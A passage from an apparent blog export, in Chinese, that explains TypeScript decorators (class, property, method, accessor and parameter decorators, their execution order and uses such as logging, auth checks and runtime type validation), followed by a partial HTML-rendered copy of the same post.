Typescript:\n命令行：\n```bash\ntsc --target ES5 --experimentalDecorators\n```\ntsconfig.json:\n```json\n{\n  \"compilerOptions\": {\n    \"target\": \"ES5\",\n    \"experimentalDecorators\": true\n  }\n}\n```\n\n\n\n## 定义\n![decorators](xmind.png)\n### 类装饰器\n📌 参数：\n- `target`: 类的 `构造器（constructor）`\n\n⬅️ 返回值: undefined | 替代原有构造器\n\n因此，类装饰器适合用于继承一个现有类并添加一些属性和方法。\n```ts\nfunction rewirteClassConstructor<T extends { new (...args: any[]): {} }>(constructor: T) {\n  return class extends constructor {\n    words = \"rewrite constructor\";\n  };\n}\n \n@rewirteClassConstructor\nclass Speak {\n  words: string;\n \n  constructor(t: string) {\n    this.words = t;\n  }\n}\n \nconst say = new Speak(\"hello world\");\nconsole.log(say.words) // rewrite constructor\n```\n\n### 属性装饰器\n\n📌 参数: \n- `target`: 对于静态成员来说是类的构造器，对于实例成员来说是类的原型链\n- `propertyKey`: 属性名称\n\n⬅️ 返回值: 返回的结果将被忽略\n\n除了用于收集信息外，属性装饰器也可以用来给类添加额外的方法和属性。 例如我们可以写一个装饰器来给某些属性添加监听器。\n```ts\nimport \"reflect-metadata\";\n\nfunction capitalizeFirstLetter(str: string) {\n  return str.charAt(0).toUpperCase() + str.slice(1);\n}\n\nfunction observable(target: any, key: string): any {\n  // prop -> onPropChange\n  const targetKey = \"on\" + capitalizeFirstLetter(key) + \"Change\";\n\n  target[targetKey] = function (fn: (prev: any, next: any) => void) {\n      let prev = this[key];\n      // tsconfig.json target to ES6\n      Reflect.defineProperty(this, key, {\n        set(next) {\n          fn(prev, next);\n          prev = next;\n        }\n      })\n    };\n}\n\nclass C {\n  \n  @observable\n  foo = -1;\n\n  onFooChange(arg0: (prev: any, next: any) => void) {}\n}\n\nconst c = new C();\n\nc.onFooChange((prev, next) => console.log(`prev: ${prev}, next: ${next}`))\n\nc.foo = 100; // -> prev: -1, next: 100\nc.foo = -3.14; // -> prev: 100, next: -3.14\n```\n\n\n### 方法装饰器\n📌 参数：\n- `target`: 对于静态成员来说是类的构造器，对于实例成员来说是类的原型链\n- `propertyKey`: 属性名称\n- `descriptor`: 属性的 [描述器](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Object/getOwnPropertyDescriptor)\n\n⬅️ 返回值：undefined | 替代属性的描述器。\n\n方法装饰器`descriptor`的key为：\n```\nvalue\nwritable\nenumerable\nconfigurable\n```\n\n通过这个参数我们可以修改方法原本的实现，添加一些共用逻辑。 例如我们可以给一些方法添加打印输入与输出的能力:\n```ts\nfunction logger(target: any, propertyKey: string, descriptor: PropertyDescriptor) {\n  const original = descriptor.value;\n\n  descriptor.value = function (...args) {\n    console.log('params: ', ...args);\n    const result = original.call(this, ...args);\n    console.log('result: ', result);\n    return result;\n  }\n}\n\nclass C {\n  @logger\n  add(x: number, y:number ) {\n    return x + y;\n  }\n}\n\nconst c = new C();\nc.add(1, 2);\n// -> params: 1, 2\n// -> result: 3\n```\n\n### 访问器装饰器\n📌 参数：\n- `target`: 对于静态成员来说是类的构造器，对于实例成员来说是类的原型链\n- `propertyKey`: 属性名称\n- `descriptor`: 属性的 [描述器](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Object/getOwnPropertyDescriptor)\n\n⬅️ 返回值：undefined | 替代属性的描述器。\n\n\n访问器装饰器`descriptor`的key为：\n```\nget\nset\nenumerable\nconfigurable\n```\n\n访问器装饰器总体上讲和方法装饰器很接近，唯一的区别在于描述器中有的key不同例如，我们可以将某个属性设为不可变值：\n```ts\nfunction immutable(target: any, propertyKey: string, descriptor: PropertyDescriptor) {\n  const original = descriptor.set;\n\n  descriptor.set = function (value: any) {\n    return original.call(this, { ...value })\n  }\n}\n\nclass C {\n  private _point = { x: 0, y: 0 }\n\n  @immutable\n  set point(value: { x: number, y: number }) {\n    this._point = value;\n  }\n\n  get point() {\n    return this._point;\n  }\n}\n\nconst c = new C();\nconst point = { x: 1, y: 1 }\nc.point = point;\n\nconsole.log(c.point === point)\n// -> false\n```\n\n### 参数装饰器\n📌 参数：\n- `target`: 对于静态成员来说是类的构造器，对于实例成员来说是类的原型链\n- `propertyKey`: 属性的名称(注意是方法的名称，而不是参数的名称)\n- `paramerterIndex`: 参数在方法中所处的位置的下标\n\n⬅️ 返回值：返回的值将会被忽略。\n\n单独的参数装饰器能做的事情很有限，它一般都被用于记录可被其它装饰器使用的信息。\n```ts\n// parameter.ts\nimport \"reflect-metadata\";\n\nfunction required(target: Object, propertyKey: string | symbol, parameterIndex: number) {\n    let existingRequiredParameters: number[] = Reflect.getOwnMetadata('required', target, propertyKey) || [];\n    existingRequiredParameters.push(parameterIndex);\n    Reflect.defineMetadata('required', existingRequiredParameters, target, propertyKey);\n}\n\nfunction validate(target: any, propertyName: string, descriptor: TypedPropertyDescriptor<Function>) {\n    let method = descriptor.value!;\n   \n    descriptor.value = function () {\n      let requiredParameters: number[] = Reflect.getOwnMetadata('required', target, propertyName);\n      if (requiredParameters) {\n        for (let parameterIndex of requiredParameters) {\n          if (parameterIndex >= arguments.length || arguments[parameterIndex] === undefined) {\n            throw new Error(\"Missing required argument.\");\n          }\n        }\n      }\n      return method.apply(this, arguments);\n    };\n  }\n\nclass BugReport {\n    type = \"report\";\n    title: string;\n   \n    constructor(t: string) {\n      this.title = t;\n    }\n   \n    @validate\n    print(@required verbose: boolean) {\n      if (verbose) {\n        return `type: ${this.type}\\ntitle: ${this.title}`;\n      } else {\n       return this.title; \n      }\n    }\n  }\n\nexport const report = new BugReport('mode error');\n```\n\n```js\n// test.js\n\nconst { report } = require('./paramerter.js');\nconsole.log(report.print()); // Error: Missing required argument.\n```\n\n## 执行顺序\n不同类型的装饰器执行顺序是明确的：\n1、 实例成员：参数装饰器 -> 方法/访问器/属性 装饰器\n2、 静态成员：参数装饰器 -> 方法/访问器/属性 装饰器\n3、 构造函数：参数装饰器\n4、 类装饰器\n例如：\n\n```ts\nfunction f(key: string): any {\n  console.log(\"evaluate: \", key);\n  return function () {\n    console.log(\"call: \", key);\n  };\n}\n\n@f(\"Class Decorator\")\nclass A {\n  @f(\"Static Property\")\n  static prop?: number;\n\n  @f(\"Static Method\")\n  static method(@f(\"Static Method Parameter\") foo) {}\n\n  constructor(@f(\"Constructor Parameter\") foo) {}\n\n  @f(\"Instance Method\")\n  method(@f(\"Instance Method Parameter\") foo) {}\n\n  @f(\"Instance Property\")\n  prop?: number;\n}\n\n// 执行顺序\nevaluate:  Instance Method\nevaluate:  Instance Method Parameter\ncall:  Instance Method Parameter\ncall:  Instance Method\nevaluate:  Instance Property\ncall:  Instance Property\nevaluate:  Static Property\ncall:  Static Property\nevaluate:  Static Method\nevaluate:  Static Method Parameter\ncall:  Static Method Parameter\ncall:  Static Method\nevaluate:  Class Decorator\nevaluate:  Constructor Parameter\ncall:  Constructor Parameter\ncall:  Class Decorator\n```\n\n然而，在同一方法中的不同参数构造器顺序是相反的，最后参数回的装饰器会先被执行：\n```ts\n\nfunction f(key: string): any {\n  console.log(\"evaluate: \", key);\n  return function () {\n    console.log(\"call: \", key);\n  };\n}\n\nclass B {\n  @f('first')\n  @f('second')\n  method() {}\n}\n\n// 执行顺序\nevaluate:  first\nevaluate:  second\ncall:  second\ncall:  first\n```\n\n\n## 使用场景\n- Before/After钩子。\n- 监听属性改变或者方法调用。\n- 对方法的参数做转换。\n- 添加额外的方法和属性。\n- 运行时类型检查。\n- 自动编解码。\n- 依赖注入。\n\n### 使用举例\n- 日志打印\n```ts\nfunction f(): any {\n  return function (target, key, descriptor) {\n    let method = descriptor.value;\n    descriptor.value = function () {\n      console.log('param: ', Array.from(arguments));\n      const value = method.apply(this, arguments);\n      console.log('result: ', value);\n      return value\n    };\n  };\n}\n\nclass B {\n  @f()\n  say(name: string) {\n      return `name is ${name}`;\n  }\n}\n```\n- 鉴权:\n```ts\nfunction auth(user) {\n  return function(target, key, descriptor) {\n    var originalMethod = descriptor.value; // 保留原有函数\n    if (!user.isAuth) {\n      descriptor.value = function() { // 未登录将返回提示\n        console.log('当前未登录，请登录!');\n      }\n    } else {\n      descriptor.value = function (...args) { // 已登录将原有函数\n        originalMethod.apply(this, args);\n      }\n    }\n    return descriptor;\n  }\n}\n\n@auth(app.user)\nfunction handleStar(new) {\n  new.like++;\n}\n```\n\n- 类型检查\n```ts\nimport \"reflect-metadata\";\nconst stringMetaDataTag = \"IsString\";\n \nfunction IsString(target: Object, propertyKey: string | symbol, parameterIndex: number) {\n  let existingRequiredParameters: number[] = Reflect.getOwnMetadata(stringMetaDataTag, target, propertyKey) || [];\n  existingRequiredParameters.push(parameterIndex);\n  Reflect.defineMetadata( stringMetaDataTag, existingRequiredParameters, target, propertyKey);\n}\n \nfunction validate(target: any, propertyName: string, descriptor: TypedPropertyDescriptor<Function>) {\n  let method = descriptor.value!;\n \n  descriptor.value = function () {\n    let stringMetaTags: number[] = Reflect.getOwnMetadata(stringMetaDataTag, target, propertyName);\n    if (stringMetaTags) {\n      for (let parameterIndex of stringMetaTags) {\n        const value = arguments[parameterIndex];\n        if (!(value instanceof String || typeof value === 'string')) {\n            throw new Error('not string');\n        }\n      }\n    }\n    return method.apply(this, arguments);\n  };\n}\n\n\nexport class A {\n    a: string = '123';\n    \n    @validate\n    value (@IsString value: string) {\n        console.log(value);\n        this.a = value;\n    }\n}\n```\n\n## 写在最后\n\b笔者在 后台接口、Js Bridge、React 项目上都有实践过。不得不说，装饰器模式在面向切面编程(AOP)几乎是 “最佳实践”，极大的提升了编程效率。也希望这篇文章能帮助到你😊\n\n\n### npm 包\n[class-validator](https://github.com/typestack/class-validator)\n[core-decorators](https://github.com/jayphelps/core-decorators)\n[Nest 后台框架](https://github.com/nestjs/nest)\n\n### 参考链接\n[tc39-proposal](https://github.com/tc39/proposal-decorators)\n[typescript](https://www.typescriptlang.org/docs/handbook/decorators.html)\n[a-complete-guide-to-typescript-decorator](https://saul-mirone.github.io/a-complete-guide-to-typescript-decorator/)\n\n","slug":"best-practice-of-decorator","published":1,"updated":"2021-10-13T15:48:55.510Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckuq8nz01000j4jzxyemftxqd","content":"<h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><p>很多语言和方法都有 AOP 编程。AOP 的好处是只需要写一次函数检查，在函数调用前只做引用即可。极大的减少了重复代码的编写。</p><p>试想一下：在函数入参检查类型时需要反复用 <code>typeof parameter === &#39;类型&#39;</code> 来做检查时一件非常痛苦的事情。虽然用了 <code>Typescript</code>，但只是解决了编码时候的类型校验，而运行时的校验依旧需要编码来做检查。</p><p>本篇介绍的 <code>Decorator</code> 用法，就是为了解决这一困扰而出现的。它不仅一行代码解决了运行时的入参类型检查；还能用一行代码做函数权限检查，只让有权限的人调用；更能一行代码解决入参和结果的日志打印。让代码更容易维护的同时，也更专注于业务的实现。</p><p>如果您对例子感兴趣，可以直接到<a href=\"#使用举例\">使用举例</a></p><h3 id=\"啥是-Decorator\"><a href=\"#啥是-Decorator\" class=\"headerlink\" title=\"啥是 Decorator?\"></a>啥是 Decorator?</h3><p>Decorator 是 ES6 中的提案之一，它实际上是个 wrapper，可以为类、属性或函数提供额外功能。举个🌰：<br></p><figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">f</span>(<span class=\"params\">key: <span class=\"built_in\">string</span></span>): <span class=\"title\">any</span> </span>&#123;</span><br><span class=\"line\">  <span class=\"built_in\">console</span>.log(<span class=\"string\">\"evaluate: \"</span>, key);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">\"call: \"</span>, key);</span><br><span class=\"line\">  &#125;;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@f</span>(<span class=\"string\">\"Class Decorator\"</span>)</span><br><span class=\"line\"><span class=\"keyword\">class</span> A &#123;</span><br><span class=\"line\">  <span class=\"keyword\">constructor</span>(<span class=\"params\"><span class=\"meta\">@f</span>(<span class=\"string\">\"Constructor Parameter\"</span>) foo</span>) &#123;&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"meta\">@f</span>(<span class=\"string\">\"Instance Method\"</span>) <span class=\"comment\">// 1</span></span><br><span class=\"line\">  method(<span class=\"meta\">@f</span>(<span class=\"string\">\"Instance Method Parameter\"</span>) foo) &#123;&#125; <span class=\"comment\">// 2</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"meta\">@f</span>(<span class=\"string\">\"Instance Property\"</span>)</span><br><span class=\"line\">  prop?: <span class=\"built_in\">number</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 基本上，装饰器会的行为就是下面这样：</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@f</span>()</span><br><span class=\"line\"><span class=\"keyword\">class</span> A</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 等同于</span></span><br><span class=\"line\">A = f(A) || A</span><br></pre></td></tr></table></figure><p></p><h2 id=\"使用前的准备\"><a href=\"#使用前的准备\" class=\"headerlink\" title=\"使用前的准备\"></a>使用前的准备</h2><p>虽然 Decorator 只是一个提案，但可通过工具来使用它：</p><h3 id=\"Babel\"><a href=\"#Babel\" class=\"headerlink\" title=\"Babel:\"></a>Babel:</h3><blockquote><p>babel-plugin-syntax-decorators<br>babel-plugin-transform-decorators-legacy</p></blockquote><h3 id=\"Typescript\"><a href=\"#Typescript\" class=\"headerlink\" title=\"Typescript:\"></a>Typescript:</h3><p>命令行：<br></p><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">tsc --target ES5 --experimentalDecorators</span><br></pre></td></tr></table></figure><p></p><p>tsconfig.json:<br></p><figure class=\"highlight json\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"attr\">\"compilerOptions\"</span>: &#123;</span><br><span class=\"line\">    <span class=\"attr\">\"target\"</span>: <span class=\"string\">\"ES5\"</span>,</span><br><span class=\"line\">    <span class=\"attr\">\"experimentalDecorators\"</span>: <span class=\"literal\">true</span></span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure><p></p><h2 id=\"定义\"><a href=\"#定义\" class=\"headerlink\" title=\"定义\"></a>定义</h2><p><img src=\"/img/loading.gif\" data-original=\"/typescript/best-practice-of-decorator/xmind.png\" alt=\"decorators\"></p><h3 id=\"类装饰器\"><a href=\"#类装饰器\" class=\"headerlink\" title=\"类装饰器\"></a>类装饰器</h3><p>📌 参数：</p><ul><li><code>target</code>: 类的 <code>构造器（constructor）</code></li></ul><p>⬅️ 返回值: undefined | 替代原有构造器</p><p>因此，类装饰器适合用于继承一个现有类并添加一些属性和方法。<br></p><figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">rewirteClassConstructor</span>&lt;<span class=\"title\">T</span> <span class=\"title\">extends</span> </span>&#123; <span class=\"keyword\">new</span> (...args: <span class=\"built_in\">any</span>[]): &#123;&#125; &#125;&gt;(<span class=\"keyword\">constructor</span>: T) &#123;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"keyword\">class</span> <span class=\"keyword\">extends</span> <span class=\"keyword\">constructor</span> &#123;</span><br><span class=\"line\">    words = <span class=\"string\">\"rewrite constructor\"</span>;</span><br><span class=\"line\">  &#125;;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"meta\">@rewirteClassConstructor</span></span><br><span class=\"line\"><span class=\"keyword\">class</span> Speak &#123;</span><br><span class=\"line\">  words: <span class=\"built_in\">string</span>;</span><br><span class=\"line\"> </span><br><span class=\"line\">  <span class=\"keyword\">constructor</span>(<span class=\"params\">t: <span class=\"built_in\">string</span></span>) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.words = t;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"keyword\">const</span> say = <span class=\"keyword\">new</span> Speak(<span class=\"string\">\"hello world\"</span>);</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(say.words) <span class=\"comment\">// rewrite constructor</span></span><br></pre></td></tr></table></figure><p></p><h3 id=\"属性装饰器\"><a href=\"#属性装饰器\" class=\"headerlink\" title=\"属性装饰器\"></a>属性装饰器</h3><p>📌 参数:</p><ul><li><code>target</code>: 对于静态成员来说是类的构造器，对于实例成员来说是类的原型链</li><li><code>propertyKey</code>: 属性名称</li></ul><p>⬅️ 返回值: 返回的结果将被忽略</p><p>除了用于收集信息外，属性装饰器也可以用来给类添加额外的方法和属性。 例如我们可以写一个装饰器来给某些属性添加监听器。<br></p><figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> <span class=\"string\">\"reflect-metadata\"</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">capitalizeFirstLetter</span>(<span class=\"params\">str: <span class=\"built_in\">string</span></span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> str.charAt(<span class=\"number\">0</span>).toUpperCase() + str.slice(<span class=\"number\">1</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">observable</span>(<span class=\"params\">target: <span class=\"built_in\">any</span>, key: <span class=\"built_in\">string</span></span>): <span class=\"title\">any</span> </span>&#123;</span><br><span class=\"line\">  <span class=\"comment\">// prop -&gt; onPropChange</span></span><br><span class=\"line\">  <span class=\"keyword\">const</span> targetKey = <span class=\"string\">\"on\"</span> + capitalizeFirstLetter(key) + <span class=\"string\">\"Change\"</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">  target[targetKey] = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\">fn: (prev: <span class=\"built_in\">any</span>, next: <span class=\"built_in\">any</span>) =&gt; <span class=\"built_in\">void</span></span>) </span>&#123;</span><br><span class=\"line\">      <span class=\"keyword\">let</span> prev = <span class=\"keyword\">this</span>[key];</span><br><span class=\"line\">      <span class=\"comment\">// tsconfig.json target to ES6</span></span><br><span class=\"line\">      Reflect.defineProperty(<span class=\"keyword\">this</span>, key, &#123;</span><br><span class=\"line\">        <span class=\"keyword\">set</span>(next) &#123;</span><br><span class=\"line\">          fn(prev, next);</span><br><span class=\"line\">          prev = next;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">      &#125;)</span><br><span class=\"line\">    &#125;;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">class</span> C &#123;</span><br><span class=\"line\">  </span><br><span class=\"line\">  <span class=\"meta\">@observable</span></span><br><span class=\"line\">  foo = <span class=\"number\">-1</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">  onFooChange(arg0: <span class=\"function\">(<span class=\"params\">prev: <span class=\"built_in\">any</span>, next: <span class=\"built_in\">any</span></span>) =&gt;</span> <span class=\"built_in\">void</span>) &#123;&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> c = <span class=\"keyword\">new</span> C();</span><br><span class=\"line\"></span><br><span class=\"line\">c.onFooChange(<span class=\"function\">(<span class=\"params\">prev, next</span>) =&gt;</span> <span class=\"built_in\">console</span>.log(<span class=\"string\">`prev: <span class=\"subst\">$&#123;prev&#125;</span>, next: <span class=\"subst\">$&#123;next&#125;</span>`</span>))</span><br><span class=\"line\"></span><br><span class=\"line\">c.foo = <span class=\"number\">100</span>; <span class=\"comment\">// -&gt; prev: -1, next: 100</span></span><br><span class=\"line\">c.foo = <span class=\"number\">-3.14</span>; <span class=\"comment\">// -&gt; prev: 100, next: -3.14</span></span><br></pre></td></tr></table></figure><p></p><h3 id=\"方法装饰器\"><a href=\"#方法装饰器\" class=\"headerlink\" title=\"方法装饰器\"></a>方法装饰器</h3><p>📌 参数：</p><ul><li><code>target</code>: 对于静态成员来说是类的构造器，对于实例成员来说是类的原型链</li><li><code>propertyKey</code>: 属性名称</li><li><code>descriptor</code>: 属性的 <a href=\"https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Object/getOwnPropertyDescriptor\" target=\"_blank\" rel=\"noopener\">描述器</a></li></ul><p>⬅️ 返回值：undefined | 替代属性的描述器。</p><p>方法装饰器<code>descriptor</code>的key为：<br></p><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">value</span><br><span class=\"line\">writable</span><br><span class=\"line\">enumerable</span><br><span class=\"line\">configurable</span><br></pre></td></tr></table></figure><p></p><p>通过这个参数我们可以修改方法原本的实现，添加一些共用逻辑。 例如我们可以给一些方法添加打印输入与输出的能力:<br></p><figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">logger</span>(<span class=\"params\">target: <span class=\"built_in\">any</span>, propertyKey: <span class=\"built_in\">string</span>, descriptor: PropertyDescriptor</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">const</span> original = descriptor.value;</span><br><span class=\"line\"></span><br><span class=\"line\">  descriptor.value = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\">...args</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">'params: '</span>, ...args);</span><br><span class=\"line\">    <span class=\"keyword\">const</span> result = original.call(<span class=\"keyword\">this</span>, ...args);</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">'result: '</span>, result);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> result;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">class</span> C &#123;</span><br><span class=\"line\">  <span class=\"meta\">@logger</span></span><br><span class=\"line\">  add(x: <span class=\"built_in\">number</span>, y:<span class=\"built_in\">number</span> ) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> x + y;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> c = <span class=\"keyword\">new</span> C();</span><br><span class=\"line\">c.add(<span class=\"number\">1</span>, <span class=\"number\">2</span>);</span><br><span class=\"line\"><span class=\"comment\">// -&gt; params: 1, 2</span></span><br><span class=\"line\"><span class=\"comment\">// -&gt; result: 3</span></span><br></pre></td></tr></table></figure><p></p><h3 id=\"访问器装饰器\"><a href=\"#访问器装饰器\" class=\"headerlink\" title=\"访问器装饰器\"></a>访问器装饰器</h3><p>📌 参数：</p><ul><li><code>target</code>: 对于静态成员来说是类的构造器，对于实例成员来说是类的原型链</li><li><code>propertyKey</code>: 属性名称</li><li><code>descriptor</code>: 属性的 <a href=\"https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Object/getOwnPropertyDescriptor\" target=\"_blank\" rel=\"noopener\">描述器</a></li></ul><p>⬅️ 返回值：undefined | 替代属性的描述器。</p><p>访问器装饰器<code>descriptor</code>的key为：<br></p><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">get</span><br><span class=\"line\">set</span><br><span class=\"line\">enumerable</span><br><span class=\"line\">configurable</span><br></pre></td></tr></table></figure><p></p><p>访问器装饰器总体上讲和方法装饰器很接近，唯一的区别在于描述器中有的key不同例如，我们可以将某个属性设为不可变值：<br></p><figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">immutable</span>(<span class=\"params\">target: <span class=\"built_in\">any</span>, propertyKey: <span class=\"built_in\">string</span>, descriptor: PropertyDescriptor</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">const</span> original = descriptor.set;</span><br><span class=\"line\"></span><br><span class=\"line\">  descriptor.set = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\">value: <span class=\"built_in\">any</span></span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> original.call(<span class=\"keyword\">this</span>, &#123; ...value &#125;)</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">class</span> C &#123;</span><br><span class=\"line\">  <span class=\"keyword\">private</span> _point = &#123; x: <span class=\"number\">0</span>, y: <span class=\"number\">0</span> &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"meta\">@immutable</span></span><br><span class=\"line\">  <span class=\"keyword\">set</span> point(value: &#123; x: <span class=\"built_in\">number</span>, y: <span class=\"built_in\">number</span> &#125;) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">this</span>._point = value;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">get</span> point() 